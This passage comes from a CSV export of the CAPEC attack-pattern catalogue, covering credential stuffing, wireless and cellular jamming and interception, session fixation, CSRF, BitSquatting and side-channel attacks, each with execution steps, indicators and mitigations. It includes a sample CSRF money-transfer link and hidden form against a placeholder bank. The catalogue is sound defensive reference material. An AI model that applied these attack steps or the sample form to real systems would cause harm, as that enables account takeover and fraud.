target grants access.:TECHNIQUE:Manually or automatically enter each username/password combination through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::\",\"::SKILL:A Credential Stuffing attack is very straightforward.:LEVEL:Low::\",\"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::A known list of username/password combinations.::A custom script that leverages the credential list to launch the attack.::\",\"::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::\",\"::A user leverages the password Password123 for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.::In October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised.::\",\"::522::307::308::309::262::263::654::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.004:ENTRY NAME:Brute Force:Credential Stuffing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Credential stuffing::\",\"\",\n601,\"Jamming\",Standard,Draft,\"An adversary uses radio noise or signals in an attempt to disrupt communications. By intentionally overwhelming system resources with illegitimate traffic, service is denied to the legitimate traffic of authorized users.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:607::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:The jamming of equipment denies the availability of functioning communications services.::\",\"\",\"\",\"\",\"\",\"\",\n603,\"Blockage\",Standard,Draft,\"An adversary blocks the delivery of an important system resource causing the system to fail or stop working.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:607::\",\"\",\"::This attack pattern requires knowledge of where important system resources are logically located as well as how they operate.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Blocking a resource from functional operation denies its availability to authorized users.::\",\"\",\"\",\"\",\"\",\"\",\n604,\"Wi-Fi Jamming\",Detailed,Draft,\"In this attack scenario, the attacker actively transmits on the Wi-Fi channel to prevent users from transmitting or receiving data from the targeted Wi-Fi network. There are several known techniques to perform this attack – for example: the attacker may flood the Wi-Fi access point (e.g. the retransmission device) with deauthentication frames. Another method is to transmit high levels of noise on the RF band used by the Wi-Fi network.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:601::\",\"\",\"::Lack of anti-jam features in 802.11::Lack of authentication on deauthentication/disassociation packets on 802.11-based networks::\",\"::SKILL:This attack can be performed by low capability attackers with freely available tools. Commercial tools are also available that can target select networks or all WiFi networks within a range of several miles.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:A successful attack will deny the availability of the Wi-fi network to authorized users.::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:The attacker's goal is to prevent users from accessing the wireless network. Denying connectivity to the wireless network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.::\",\"::Countermeasures have been proposed for both disassociation flooding and RF jamming, however these countermeasures are not standardized and would need to be supported on both the retransmission device and the handset in order to be effective. Commercial products are not currently available that support jamming countermeasures for Wi-Fi.::\",\"\",\"\",\"\",\"\",\n605,\"Cellular Jamming\",Detailed,Draft,\"In this attack scenario, the attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. Several existing techniques are known in the open literature for this attack for 2G, 3G, and 4G LTE cellular technology. For example, some attacks target cell towers by overwhelming them with false status messages, while others introduce high levels of noise on signaling channels.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:601::\",\"\",\"::Lack of anti-jam features in cellular technology (2G, 3G, 4G, LTE)::\",\"::SKILL:This attack can be performed by low capability attackers with commercially available tools.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:The attacker's goal is to prevent users from accessing the cellular network. Denying connectivity to the cellular network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.::\",\"::Mitigating this attack requires countermeasures employed on both the retransmission device as well as on the cell tower. Therefore, any system that relies on existing commercial cell towards will likely be vulnerable to this attack. By using a private cellular LTE network (i.e., a custom cell tower), jamming countermeasures could be developed and employed.::\",\"\",\"\",\"\",\"\",\n606,\"Weakening of Cellular Encryption\",Detailed,Draft,\"An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode).\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:620::\",\"\",\"::Cellular devices that allow negotiating security modes to facilitate backwards compatibility and roaming on legacy networks.::\",\"::SKILL:Adversaries can purchase and implement rogue BTS stations at a cost effective rate, and can push a mobile device to downgrade to a non-secure cellular protocol like 2G over GSM or CDMA.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Tracking, Network Reconnaissance::\",\"::Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.::Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.::\",\"\",\"::757::\",\"\",\"\",\n607,\"Obstruction\",Meta,Draft,\"An attacker obstructs the interactions between system components. By interrupting or disabling these interactions, an adversary can often force the system into a degraded state or cause the system to stop working as intended. This can cause the system components to be unavailable until the obstruction mitigated.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"\",\"\",\"\",\"\",\"\",\n608,\"Cryptanalysis of Cellular Encryption\",Detailed,Draft,\"The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:97::\",\"\",\"::None::\",\"::SKILL:Adversaries can rent commercial supercomputer time globally to conduct cryptanalysis on encrypted data captured from mobile devices. Foreign governments have their own cryptanalysis technology and capabilities. Commercial cellular standards for encryption (GSM and CDMA) are also subject to adversary cryptanalysis.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Reveals IMSI and IMEI for tracking of retransmission device and enables further follow-on attacks by revealing black network control messages. (e.g., revealing IP addresses of enterprise servers for VOIP connectivity)::\",\"::Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.::Monitor cellular RF interface to detect the usage of weaker-than-expected cellular encryption.::\",\"\",\"::327::\",\"\",\"\",\n609,\"Cellular Traffic Intercept\",Detailed,Draft,\"Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:157::\",\"\",\"::None::\",\"::SKILL:Adversaries can purchase hardware and software solutions, or create their own solutions, to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for rogue BTS stations is poor in many areas and it is assumed that rogue BTS stations exist in urban areas.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic, and telemetry analysis of non-encrypted data. (packet headers, cellular power data, signal strength, etc.)::\",\"::Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography, all the way to the VPN gateway at the datacenter.::\",\"\",\"::311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n61,\"Session Fixation\",Detailed,Draft,\"The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:593::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.:TECHNIQUE:The attacker chooses a predefined identifier that they know.:TECHNIQUE:The attacker creates a trap session for the victim.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.:TECHNIQUE:Attackers can put links on web sites (such as forums, blogs, or comment forms).:TECHNIQUE:Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.:TECHNIQUE:Attackers can email attack URLs to potential victims through spam and phishing techniques.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.:TECHNIQUE:The attacker loads the predefined session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined session ID into their software and utilizes functionality with the rights of the victim.::\",\"::Session identifiers that remain unchanged when the privilege levels change.::Permissive session management mechanism that accepts random user-generated session identifiers::Predictable session identifiers::\",\"::SKILL:Only basic skills are required to determine and fixate session identifiers in a user's browser. Subsequent attacks may require greater skill levels depending on the attackers' motives.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.::A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.::Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::\",\"::Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.::An attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182::\",\"::384::664::732::\",\"TAXONOMY NAME:WASC:ENTRY ID:37:ENTRY NAME:Session Fixation::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session fixation::\",\"\",\n610,\"Cellular Data Injection\",Standard,Stable,\"Adversaries inject data into mobile technology traffic (data flows or signaling data) to disrupt communications or conduct additional surveillance operations.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:240::\",\"\",\"::None::\",\"::SKILL:Often achieved by nation states in conjunction with commercial cellular providers to conduct cellular traffic intercept and possible traffic injection.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Attackers can disrupt or deny mobile technology communications and operations.::SCOPE:Availability:TECHNICAL IMPACT:Modify Data:NOTE:Attackers can inject false data into data or signaling system data flows of communications and operations, or re-route data flows or signaling data for the purpose of further data intercept and capture.::\",\"::Commercial defensive technology to detect and alert to any attempts to modify mobile technology data flows or to inject new data into existing data flows and signaling data.::\",\"\",\"\",\"\",\"\",\n611,\"BitSquatting\",Detailed,Draft,\"An adversary registers a domain name one bit different than a trusted domain. A BitSquatting attack leverages random errors in memory to direct Internet traffic to adversary-controlled destinations. BitSquatting requires no exploitation or complicated reverse engineering, and is operating system and architecture agnostic. Experimental observations show that BitSquatting popular websites could redirect non-trivial amounts of Internet traffic to a malicious entity.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.:TECHNIQUE:Research popular or high traffic websites.::STEP:2:PHASE:Experiment:DESCRIPTION:[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the BitSquatted URL.:TECHNIQUE:Register the BitSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:[Wait for a user to visit the domain] Finally, the adversary simply waits for a user to be unintentionally directed to the BitSquatted domain.:TECHNIQUE:Simply wait for an error in memory to occur, redirecting the user to the malicious domain.::\",\"::An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.::\",\"::SKILL:Adversaries must be able to register DNS hostnames/URL’s.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Other:TECHNICAL IMPACT:Other:NOTE:Depending on the intention of the adversary, a successful BitSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::\",\"::Authenticate all servers and perform redundant checks when using DNS hostnames.::When possible, use error-correcting (ECC) memory in local devices as non-ECC memory is significantly more vulnerable to faults.::\",\"\",\"\",\"\",\"\",\n612,\"WiFi MAC Address Tracking\",Detailed,Draft,\"In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::None::\",\"::SKILL:Open source and commercial software tools are available and several commercial advertising companies routinely set up tools to collect and monitor MAC addresses.:LEVEL:Low::\",\"\",\"\",\"\",\"::Automatic randomization of WiFi MAC addresses::Frequent changing of handset and retransmission device::\",\"\",\"::201::300::\",\"\",\"\",\n613,\"WiFi SSID Tracking\",Detailed,Draft,\"In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::None::\",\"::SKILL:Open source and commercial software tools are available and open databases of known WiFi SSID addresses are available online.:LEVEL:Low::\",\"\",\"\",\"\",\"::Do not enable the feature of Hidden SSIDs (also known as Network Cloaking) – this option disables the usual broadcasting of the SSID by the access point, but forces the mobile handset to send requests on all supported radio channels which contains the SSID. The result is that tracking of the mobile device becomes easier since it is transmitting the SSID more frequently.::Frequently change the SSID to new and unrelated values::\",\"\",\"::201::300::\",\"\",\"\",\n614,\"Rooting SIM Cards\",Detailed,Draft,\"SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"::A SIM card that relies on the DES cipher.::\",\"::SKILL:This is a sophisticated attack, but detailed techniques are published in open literature.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Upgrade the SIM card to use the state-of-the-art AES or the somewhat outdated 3DES algorithm for OTA.::\",\"\",\"::327::\",\"\",\"\",\n615,\"Evil Twin Wi-Fi Attack\",Detailed,Draft,\"Adversaries install Wi-Fi equipment that acts as a legitimate Wi-Fi network access point. When a device connects to this access point, Wi-Fi data traffic is intercepted, captured, and analyzed. This also allows the adversary to use adversary-in-the-middle (CAPEC-94) for all communications.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:616::\",\"\",\"::None::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Intercept and control Wi-Fi data communications to/from mobile device.::\",\"::Commercial defensive technology that monitors for rogue Wi-Fi access points, adversary-in-the-middle attacks, and anomalous activity with the mobile device baseband radios.::\",\"\",\"::300::\",\"\",\"\",\n616,\"Establish Rogue Location\",Standard,Stable,\"An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:154::NATURE:CanPrecede:CAPEC ID:691::\",\"\",\"::A resource is expected to available to the user.::\",\"::SKILL:Adversaries can often purchase low-cost technology to implement rogue access points.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:TECHNICAL IMPACT:Other:NOTE:Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary's subsequent actions.::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.005:ENTRY NAME:Masquerading: Match Legitimate Name or Location::\",\"\",\n617,\"Cellular Rogue Base Station\",Detailed,Draft,\"In this attack scenario, the attacker imitates a cellular base station with their own rogue base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:616::\",\"\",\"::None::\",\"::SKILL:This technique has been demonstrated by amateur hackers and commercial tools and open source projects are available to automate the attack.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Intercept and control cellular data communications to/from mobile device.::\",\"::Passively monitor cellular network connection for real-time threat detection and logging for manual review.::\",\"\",\"\",\"\",\"\",\n618,\"Cellular Broadcast Message Request\",Detailed,Draft,\"In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The attacker must have knowledge of the target’s mobile phone number.::\",\"::SKILL:Open source and commercial tools are available for this attack.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Other:TECHNICAL IMPACT:Other:NOTE:An attacker could verify that the target is in (or not in) a given location.::\",\"::Frequent changing of mobile number.::\",\"\",\"::201::\",\"\",\"\",\n619,\"Signal Strength Tracking\",Detailed,Draft,\"In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"\",\"::SKILL:Commercial tools are available.:LEVEL:Low::\",\"\",\"\",\"\",\"\",\"\",\"::201::\",\"\",\"\",\n62,\"Cross Site Request Forgery\",Standard,Draft,\"An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.\",\"::TERM:Session Riding:DESCRIPTION:::\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:21::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to them (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.:TECHNIQUE:Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server:TECHNIQUE:Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server:TECHNIQUE:View HTML source of web pages that contain links or buttons that perform actions of interest.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.:TECHNIQUE:Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000):TECHNIQUE:Create a form that will submit a POST request (e.g. <form method=POST action=https://www.somebank.com/members/transfer.asp><input type=hidden Name=to value=012345678901/><input type=hidden Name=amt value=10000/><input type=submit src=clickhere.jpg/></form>::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.:TECHNIQUE:Execute a phishing attack and send the user an e-mail convincing them to click on a link.:TECHNIQUE:Execute a stored XSS attack on a website to permanently embed the malicious link into the website.:TECHNIQUE:Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.:TECHNIQUE:Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.::\",\"\",\"::SKILL:The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes.:LEVEL:Medium::\",\"::All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.::Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.::Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.::In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.::\",\"::While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.::\",\"::352::306::664::732::1275::\",\"TAXONOMY NAME:WASC:ENTRY ID:09:ENTRY NAME:Cross-Site Request Forgery::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cross Site Request Forgery (CSRF)::\",\"\",\n620,\"Drop Encryption Level\",Standard,Draft,\"An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:212::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::757::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1600:ENTRY NAME:Weaken Encryption::\",\"\",\n621,\"Analysis of Packet Timing and Sizes\",Detailed,Draft,\"An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:189::\",\"\",\"::Use of untrusted communication paths enables an attacker to intercept and log communications, including metadata such as packet timing and sizes.::\",\"::SKILL:These attacks generally require sophisticated machine learning techniques and require traffic capture as a prerequisite.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Derive sensitive information about encrypted data.::\",\"::Distort packet sizes and timing at VPN layer by adding padding to normalize packet sizes and timing delays to reduce information leakage via timing.::\",\"\",\"::201::\",\"\",\"\",\n622,\"Electromagnetic Side-Channel Attack\",Detailed,Draft,\"In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:189::\",\"\",\"::Proximal access to the device.::\",\"::SKILL:Sophisticated attack, but detailed techniques published in the open literature.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Derive sensitive information about encrypted data. For mobile devices, depending on which keys are compromised, the attacker may be able to decrypt VOIP communications, impersonate the targeted caller, or access the enterprise VPN server.::\",\"::Utilize side-channel resistant implementations of all crypto algorithms.::Strong physical security of all devices that contain secret key information. (even when devices are not in use)::\",\"\",\"::201::\",\"\",\"\",\n623,\"Compromising Emanations Attack\",Detailed,Draft,\"Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:189::\",\"\",\"::Proximal access to the device.::\",\"::SKILL:Sophisticated attack.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Capture vibrations/emissions from the handset or retransmission device display screen to recreat display information from a distance.::\",\"::None are known.::\",\"\",\"::201::\",\"\",\"\",\n624,\"Hardware Fault Injection\",Meta,Stable,\"The adversary uses disruptive signals or events, or alters the physical environment a device operates in, to cause faulty behavior in electronic devices. This can include electromagnetic pulses, laser pulses, clock glitches, ambient temperature extremes, and more. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information.\",\"::TERM:Side-Channel Attack:DESCRIPTION:::\",Low,High,\"\",\"\",\"::Physical access to the system::The adversary must be cognizant of where fault injection vulnerabilities exist 